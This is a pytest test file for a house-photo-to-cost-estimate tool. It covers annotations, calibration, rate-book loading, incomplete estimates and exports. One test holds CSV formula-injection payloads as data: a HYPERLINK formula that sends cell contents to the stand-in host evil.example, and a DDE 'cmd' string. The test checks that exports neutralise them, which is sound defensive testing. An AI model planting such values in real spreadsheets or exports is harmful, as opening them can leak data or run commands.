"""Review round 2, group F (engine side): pipeline user evidence and stale twins, reference targets,
rate-book loading limits and required metadata, incomplete estimates, boundary bases and exports.

Findings covered: VIS-4, SPEC-2, VIS-1 / SPEC-5 (engine helpers), SEC-1, SEC-3, SPEC-8, UI-8, SPEC-7,
SPEC-11, UI-18.
"""

from __future__ import annotations

import csv
import io
import json
import time

import pytest
from PIL import Image, ImageDraw

from housebuilder_vision import pipeline as P
from housebuilder_vision.core.models import (
    CostParameters,
    DetectedFeature,
    FeatureType,
    ImageKind,
    Project,
    RateBook,
    ReferenceMeasurement,
    ScenarioOutcome,
    TaxTreatment,
    TwinEdit,
    ViewDirection,
)
from housebuilder_vision.core.provenance import Basis, EditRecord
from housebuilder_vision.costing.engine import INCOMPLETE_WARNING
from housebuilder_vision.costing.rates import (
    MAX_COLUMNS,
    RateBookError,
    load_rate_book_csv,
    load_rate_book_json,
    resolve_rate_detailed,
)
from housebuilder_vision.demo.build_demo import (
    build_demo_project,
    build_uncalibrated_demo_project,
    demo_registry,
    main_facade_feature_id,
)
from housebuilder_vision.io.export import boundary_rows, csv_bytes, geometry_rows, rate_book_rows


# =============================================================================
# helpers
# =============================================================================
def _plain_image_project(store):
    """A project with one blank front photo and a user annotation set (no detection fixture)."""
    from housebuilder_vision.vision.ingest import ingest_image

    im = Image.new("RGB", (1000, 700), (200, 200, 200))
    ImageDraw.Draw(im).rectangle((200, 250, 800, 650), outline=(0, 0, 0))
    buf = io.BytesIO()
    im.save(buf, "PNG")
    asset = ingest_image(buf.getvalue(), "house.png", kind=ImageKind.PHOTOGRAPH, view=ViewDirection.FRONT,
                         store_dir=store)
    iid = asset.image_id

    def f(fid, t, **geom):
        return DetectedFeature(feature_id=f"usr:{iid}:{fid}", image_id=iid, feature_type=FeatureType(t),
                               basis=Basis.USER_CONFIRMED, method=P.ANNOTATION_METHOD, method_version="user",
                               attributes={"block": "main"} if t in ("facade",) else {}, **geom)

    ann = [f("0000000a", "facade", bbox=(200, 250, 800, 650)),
           f("0000000b", "ground_line", line=(200, 650, 800, 650)),
           f("0000000c", "eaves_line", line=(200, 300, 800, 300)),
           f("0000000d", "ridge_line", line=(220, 160, 780, 160)),
           f("0000000e", "door", bbox=(450, 480, 550, 650)),
           f("0000000f", "window", bbox=(260, 500, 360, 590)),
           f("00000010", "window", bbox=(640, 500, 740, 590)),
           f("00000011", "window", bbox=(260, 340, 360, 430)),
           f("00000012", "window", bbox=(640, 340, 740, 430))]
    project = Project(project_id="plot-12", name="Plot 12", images=[asset])
    from housebuilder_vision.quantities.library import default_library
    from housebuilder_vision.costing.adapters import demo_rate_book

    project.library, project.rate_book = default_library(), demo_rate_book()
    project.analysis = P.analyse_images([asset], store_dir=store, registry=demo_registry(),
                                        manual_features={iid: ann})
    return project, iid, ann


# =============================================================================
# VIS-4: run_pipeline keeps the user's annotations and rejections
# =============================================================================
def test_run_pipeline_reuses_stored_annotations(tmp_path):
    store = tmp_path / "s"
    project, iid, ann = _plain_image_project(store)
    project.references = [ReferenceMeasurement(image_id=iid, feature_id=ann[0].feature_id, real_length=9.6,
                                               tolerance=0.02, description="measured frontage")]
    result = P.run_pipeline(project, store_dir=store, simulate=False, registry=demo_registry())
    main = next(f for f in result.analysis.facades if f.block_hint == "main")
    assert main.width_px.value == pytest.approx(600) and main.width_px.basis == Basis.USER_CONFIRMED
    assert result.calibration.method == "reference_measurement"
    assert result.twin.block("main").width.value == pytest.approx(9.6)
    assert any("User evidence from the stored analysis re-used" in n for n in result.notes)


def test_run_pipeline_keeps_a_rejected_detection_rejected(tmp_path):
    store = tmp_path / "s"
    project = build_demo_project(store)
    a0 = project.analysis.analyses[0]
    win = next(f for f in a0.features if f.feature_type == FeatureType.WINDOW and f.active)
    rec = EditRecord(actor="user", target=win.feature_id, field="active", old_value=True, new_value=False,
                     reason=P.REJECT_REASON)
    rejected = win.model_copy(update={"active": False, "history": [rec]})
    n_open = sum(len(f.openings) for f in project.analysis.facades)
    project.analysis = P.analyse_images(project.images, store_dir=store, registry=demo_registry(),
                                        manual_features={a0.image_id: [rejected]})
    assert sum(len(f.openings) for f in project.analysis.facades) == n_open - 1
    result = P.run_pipeline(project, store_dir=store, simulate=False, registry=demo_registry())
    again = next(f for a in result.analysis.analyses for f in a.features if f.feature_id == win.feature_id)
    assert not again.active
    assert sum(len(f.openings) for f in result.analysis.facades) == n_open - 1


def test_manual_from_analysis_keeps_user_history_only():
    iid = "img_0123456789abcdef"
    created = EditRecord(actor="user", target="usr:x", field="feature", reason=P.ANNOTATION_CREATED)
    engine = EditRecord(actor="system", target="usr:x", field="basis", reason="engine note")
    ann = DetectedFeature(feature_id=f"usr:{iid}:00000001", image_id=iid, feature_type=FeatureType.WINDOW,
                          bbox=(1, 1, 5, 5), method=P.ANNOTATION_METHOD, basis=Basis.USER_CONFIRMED,
                          history=[created, engine, created])
    det = DetectedFeature(feature_id=f"{iid}.f01", image_id=iid, feature_type=FeatureType.DOOR, bbox=(1, 1, 5, 9),
                          active=False, history=[EditRecord(actor="user", field="active", reason=P.REJECT_REASON)])
    other = DetectedFeature(feature_id=f"{iid}.f02", image_id=iid, feature_type=FeatureType.DOOR, bbox=(1, 1, 5, 9))
    from housebuilder_vision.core.models import AnalysisResult, ImageAnalysis

    a = AnalysisResult(images=[], analyses=[ImageAnalysis(image_id=iid, features=[ann, det, other])])
    out = P.manual_from_analysis(a)[iid]
    assert [f.feature_id for f in out] == [ann.feature_id, det.feature_id]
    assert [h.reason for h in out[0].history] == [P.ANNOTATION_CREATED]  # duplicate + engine record dropped
    assert P.is_user_rejection(out[1])


# =============================================================================
# SPEC-2: an unedited twin follows new evidence; an edited one is kept with a warning
# =============================================================================
def test_run_pipeline_rebuilds_an_unedited_twin_after_a_new_reference(tmp_path):
    store = tmp_path / "s"
    project = build_uncalibrated_demo_project(store)
    r0 = P.run_pipeline(project, store_dir=store, simulate=False, registry=demo_registry())
    assert r0.twin.calibration_method == "prior_cues" and r0.twin.block("main").width.basis == Basis.ASSUMED
    iid = project.images[0].image_id
    project.references = [ReferenceMeasurement(image_id=iid, feature_id=main_facade_feature_id(project.analysis, iid),
                                               real_length=11.0, tolerance=0.02, description="measured frontage")]
    r1 = P.run_pipeline(project, store_dir=store, simulate=False, registry=demo_registry())
    w = r1.twin.block("main").width
    assert r1.twin.calibration_method == "reference_measurement"
    assert w.value == pytest.approx(11.0) and w.basis == Basis.USER_CONFIRMED
    assert r1.twin.version == r0.twin.version + 1
    assert r1.twin.edit_log[-1].actor == "system:pipeline"
    cost0 = r0.estimate.boundary("construction_incl_contingency").amount
    assert r1.estimate.boundary("construction_incl_contingency").amount != pytest.approx(cost0)
    assert any("rebuilt from the updated" in n for n in r1.notes)
    # unchanged evidence: the twin is kept as is
    r2 = P.run_pipeline(project, store_dir=store, simulate=False, registry=demo_registry())
    assert r2.twin.version == r1.twin.version and any("unchanged" in n for n in r2.notes)


def test_run_pipeline_keeps_an_edited_twin_but_warns_when_evidence_changed(tmp_path):
    from housebuilder_vision.twin.builder import apply_twin_edit

    store = tmp_path / "s"
    project = build_uncalibrated_demo_project(store)
    P.run_pipeline(project, store_dir=store, simulate=False, registry=demo_registry())
    project.twin = apply_twin_edit(project.twin, TwinEdit(target_type="block", target_id="main", field="depth",
                                                          value=8.4, tolerance=0.05, reason="measured"))
    iid = project.images[0].image_id
    project.references = [ReferenceMeasurement(image_id=iid, feature_id=main_facade_feature_id(project.analysis, iid),
                                               real_length=11.0, tolerance=0.02, description="measured frontage")]
    r = P.run_pipeline(project, store_dir=store, simulate=False, registry=demo_registry())
    assert r.twin.block("main").depth.value == pytest.approx(8.4)
    assert r.twin.calibration_method == "prior_cues"  # kept, with its edit
    assert any(w.startswith("Twin based on earlier evidence") for w in r.warnings)


def test_build_wrapper_records_the_hypothesis_fingerprint(tmp_path):
    project = build_demo_project(tmp_path / "s")
    hyp = next(h for h in project.hypotheses if h.hypothesis_id == project.twin.source_hypothesis_id)
    assert project.twin.source_fingerprint == P.fingerprint(hyp)


# =============================================================================
# VIS-1 / SPEC-5 (engine side): a reference never silently moves to another feature
# =============================================================================
def test_reference_target_problem_detects_type_span_and_removal(tmp_path):
    store = tmp_path / "s"
    project, iid, ann = _plain_image_project(store)
    ref = P.snapshot_reference(project.analysis, ReferenceMeasurement(
        image_id=iid, feature_id=ann[0].feature_id, real_length=9.6, tolerance=0.02))
    assert ref.feature_type == "facade" and ref.feature_span_px == pytest.approx(600)
    assert P.reference_target_problem(project.analysis, ref) is None
    # a different feature under the same id (e.g. a row-position id re-used) -> refused
    swapped = [a.model_copy(update={"feature_type": FeatureType.WINDOW, "bbox": (260, 500, 360, 590)})
               if a.feature_id == ann[0].feature_id else a for a in ann]
    an2 = P.analyse_images(project.images, store_dir=store, registry=demo_registry(), manual_features={iid: swapped})
    assert "is now a window" in P.reference_target_problem(an2, ref)
    # the box was edited beyond its pixel band
    narrower = [a.model_copy(update={"bbox": (200, 250, 700, 650)}) if a.feature_id == ann[0].feature_id else a
                for a in ann]
    an3 = P.analyse_images(project.images, store_dir=store, registry=demo_registry(), manual_features={iid: narrower})
    assert "600.0 px -> 500.0 px" in P.reference_target_problem(an3, ref)
    # removed
    an4 = P.analyse_images(project.images, store_dir=store, registry=demo_registry(), manual_features={iid: ann[1:]})
    assert "no longer exists" in P.reference_target_problem(an4, ref)
    # run_pipeline refuses to calibrate from the changed feature
    project.analysis, project.references = an3, [ref]
    project.images = project.images  # re-analysed from the stored annotations (the narrower box)
    with pytest.raises(ValueError, match="reference measurement not usable"):
        P.run_pipeline(project, store_dir=store, simulate=False, registry=demo_registry())


# =============================================================================
# SEC-1 / SEC-3 / SPEC-8: rate books
# =============================================================================
HDR = "rate_id,cost_key,description,layer,unit,value,effective_date,source,source_type,supplier\n"


def test_rate_book_csv_download_is_formula_safe():
    row = ('r1,mat:brick,"=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")",materials,nr,0.6,2026-01-01,'
           '"@SUM(1+1)",supplier_quote,"+cmd|\' /C calc\'!A0"\n')
    book = load_rate_book_csv(io.BytesIO((HDR + row).encode()), name="x")
    data = csv_bytes(*rate_book_rows(book)).decode("utf-8")
    rec = next(csv.DictReader(io.StringIO(data)))
    assert rec["description"].startswith("'=HYPERLINK(")
    assert rec["source"] == "'@SUM(1+1)" and rec["supplier"].startswith("'+cmd")
    assert "nan" not in data.lower().split(",")  # empty optional fields stay empty


def test_rate_book_loader_limits_columns_nesting_and_unknown_column_names():
    cols = ",".join(f"c{i}" for i in range(50_000))
    wide = (HDR.strip() + "," + cols + "\n").encode()
    t0 = time.perf_counter()
    with pytest.raises(RateBookError, match=f"at most {MAX_COLUMNS}"):
        load_rate_book_csv(io.BytesIO(wide), name="wide")
    assert time.perf_counter() - t0 < 2.0
    with pytest.raises(RateBookError, match="nested too deeply"):
        load_rate_book_json(io.BytesIO(b"[" * 200_000 + b"]" * 200_000), name="deep")
    with pytest.raises(RateBookError):
        load_rate_book_json(io.BytesIO(b'{"rates": [1e999999'), name="bad")
    extra = ",".join(f"x{i}" for i in range(30))
    text = (HDR.strip() + "," + extra + "\n" + "r1,mat:brick,,materials,nr,1,2026-01-01,s,manual," + "," * 30 + "\n")
    book = load_rate_book_csv(io.BytesIO(text.encode()), name="x")
    w = next(w for w in book.warnings if w.startswith("ignored unknown column"))
    assert "... and 10 more" in w and len(w) < 400
    many_keys = [{**{f"k{i}": 1 for i in range(MAX_COLUMNS + 1)}}]
    jb = load_rate_book_json(io.BytesIO(json.dumps(many_keys).encode()), name="j")
    assert not jb.rates and any(f"at most {MAX_COLUMNS}" in w for w in jb.warnings)


def test_minimal_rate_book_reports_defaulted_metadata_and_resolves_as_assumed():
    row = "Q1,mat:brick,brick,materials,nr,0.95,2026-01-01,prices inc VAT; EUR,supplier_quote,Brick Co\n"
    book = load_rate_book_csv(io.BytesIO((HDR + row).encode()), name="min")
    text = " | ".join(book.warnings)
    for field in ("currency", "tax_treatment", "delivery_treatment", "location", "uncertainty_low"):
        assert field in text, field
    assert "supplier_quote 'Q1' does not state its currency or tax treatment" in text
    r = book.rates[0]
    assert r.tax_treatment == TaxTreatment.UNKNOWN and "[assumed defaults:" in r.notes
    from housebuilder_vision.core.settings import ProjectSettings

    rr = resolve_rate_detailed(book, "mat:brick", "nr", settings=ProjectSettings())
    assert rr.basis == Basis.ASSUMED  # a supplier quote would otherwise be user-confirmed
    assert any("unknown tax treatment" in w for w in rr.warnings)
    assert any("does not state the currency" in w for w in rr.warnings)
    # a complete row is not tagged
    full = ("rate_id,cost_key,layer,unit,currency,value,location,effective_date,source,source_type,tax_treatment,"
            "delivery_treatment,uncertainty_low,uncertainty_high\n"
            "Q2,mat:brick,materials,nr,GBP,0.9,Exampleton,2026-01-01,quote 7,supplier_quote,ex_vat,"
            "delivered_included,-0.05,0.05\n")
    b2 = load_rate_book_csv(io.BytesIO(full.encode()), name="full")
    assert b2.warnings == [] and "[assumed defaults:" not in b2.rates[0].notes
    assert resolve_rate_detailed(b2, "mat:brick", "nr", settings=ProjectSettings()).basis == Basis.USER_CONFIRMED


# =============================================================================
# UI-8 / SPEC-7: incomplete estimates, fallback currency, boundary bases
# =============================================================================
def _demo_eval(tmp_path, *, settings_update=None, cost_params=None, rate_book=None):
    project = build_demo_project(tmp_path / "s")
    settings = project.settings.model_copy(update=settings_update or {})
    boq = P.calculate_quantities(project.twin, project.library)
    sims = P.run_digital_simulations(project.twin, boq, project.library, settings)
    est = P.estimate_construction_cost(boq, rate_book or project.rate_book, cost_params or project.cost_parameters,
                                       settings=settings, programme_weeks=sims["programme"].duration_weeks,
                                       logistics=sims["logistics"], library=project.library)
    return project, est


def test_currency_switch_without_fx_is_flagged_incomplete_and_never_relabels_fallbacks(tmp_path):
    _, est = _demo_eval(tmp_path, settings_update={"currency": "EUR"},
                        cost_params=CostParameters(currency="GBP"))
    assert est.warnings[0].startswith(INCOMPLETE_WARNING) and "GBP" in est.warnings[0]
    ids = {ln.line_id for ln in est.lines}
    assert not ids & {"4:log.delivery_loads", "4:log.skips", "5:prelim.setup", "5:prelim.weekly"}
    assert any("CostParameters.prelims_weekly_cost = GBP" in u for u in est.unresolved_items)
    b = est.boundary("construction_incl_contingency")
    assert b.unresolved_count > 0 and b.amount == pytest.approx(0.0)


def test_fallbacks_are_converted_with_the_fx_rate(tmp_path):
    project = build_demo_project(tmp_path / "s0")
    fallback_keys = ("prelim:weekly", "prelim:setup", "log:delivery_load", "log:skip")
    no_prelims = RateBook(name="no prelims", rates=[r for r in project.rate_book.rates
                                                    if r.cost_key not in fallback_keys])
    _, est = _demo_eval(tmp_path, settings_update={"currency": "EUR", "fx_rates": {"GBP": 1.15}},
                        cost_params=CostParameters(currency="GBP"), rate_book=no_prelims)
    weekly = next(ln for ln in est.lines if ln.line_id == "5:prelim.weekly")
    assert weekly.rate_value == pytest.approx(1800 * 1.15) and "converted GBP->EUR" in weekly.formula
    assert not any(w.startswith(INCOMPLETE_WARNING) for w in est.warnings)


def test_pricing_date_before_every_rate_names_the_cause(tmp_path):
    from datetime import date

    _, est = _demo_eval(tmp_path, settings_update={"pricing_date": date(2026, 9, 1)})
    assert est.warnings[0].startswith(INCOMPLETE_WARNING)
    assert "dated after the pricing date 2026-09-01" in est.warnings[0]
    assert all(b.unresolved_count > 0 for b in est.boundaries)


def test_boundaries_carry_basis_and_completeness(tmp_path):
    project, est = _demo_eval(tmp_path)
    assert all(b.unresolved_count == 0 for b in est.boundaries)
    mat = est.boundary("materials")
    from housebuilder_vision.core.provenance import weakest_basis

    assert mat.basis == weakest_basis([ln.basis for ln in est.lines if ln.layer.value.startswith("1_")])
    assert est.boundary("construction_incl_contingency").basis == Basis.ASSUMED  # assumed contingency
    cols, rows = boundary_rows(est, project.rate_book)
    assert {"basis", "unresolved_items", "completeness"} <= set(cols)
    assert all(r["completeness"] == "complete" for r in rows)


# =============================================================================
# SPEC-11: geometry summary (gross wall, door areas) in the UI table and geometry_summary.csv
# =============================================================================
def test_geometry_summary_export_reports_gross_wall_and_door_areas(tmp_path):
    project = build_demo_project(tmp_path / "s")
    boq = P.calculate_quantities(project.twin, project.library)
    g = boq.geometry
    _, rows = geometry_rows(g, project.twin)
    by = {r["field"]: r for r in rows}
    assert by["external_wall_gross_m2"]["value"] == pytest.approx(g.external_wall_gross_m2)
    assert by["door_area_m2"]["value"] == pytest.approx(g.door_area_m2) and g.door_area_m2 > 0
    assert by["garage_door_area_m2"]["value"] == pytest.approx(g.garage_door_area_m2) and g.garage_door_area_m2 > 0
    assert by["gia_m2"]["basis"] == "assumed"  # hidden depth / assumed wall assembly
    out = tmp_path / "out"
    manifest = P.export_project(project, out, boq=boq, formats=["csv"])
    assert "geometry_summary.csv" in {f.path for f in manifest.files}
    rec = {r["field"]: r for r in csv.DictReader((out / "geometry_summary.csv").open(encoding="utf-8"))}
    assert float(rec["external_wall_gross_m2"]["value"]) == pytest.approx(g.external_wall_gross_m2)


# =============================================================================
# UI-18: scenario cost intervals never produce negative whiskers
# =============================================================================
def test_scenario_interval_is_drawn_without_negative_whiskers():
    from housebuilder_vision.ui import charts

    base = dict(hypothesis_id="H-B", gia_m2=150.0, external_wall_thickness_m=0.3, contract_sum=260000.0,
                cost_per_m2_gia=1500.0, labour_hours=2000.0, programme_weeks=17.0, embodied_carbon_kgco2e=50000.0,
                heat_loss_coefficient_w_k=150.0, peak_heat_load_kw=5.0)
    outs = [ScenarioOutcome(scenario_id="S4", name="H-B", construction_cost=234705.0, cost_p10=235576.0,
                            cost_p50=250000.0, cost_p90=285664.0, **base),
            ScenarioOutcome(scenario_id="S1", name="H-A", construction_cost=230000.0, cost_p10=225000.0,
                            cost_p50=240000.0, cost_p90=270000.0, **base)]
    fig = charts.scenario_multiples(outs, "GBP")
    for tr in fig.data:
        ex = getattr(tr, "error_x", None)
        assert ex is None or ex.arrayminus is None or all(v >= 0 for v in ex.arrayminus)
    seg = next(tr for tr in fig.data if tr.name == "P10-P90")
    xs = [x for x in seg.x if x is not None]
    assert min(xs) == pytest.approx(225000.0) and max(xs) == pytest.approx(285664.0)
    assert any(tr.name == "P50" for tr in fig.data)
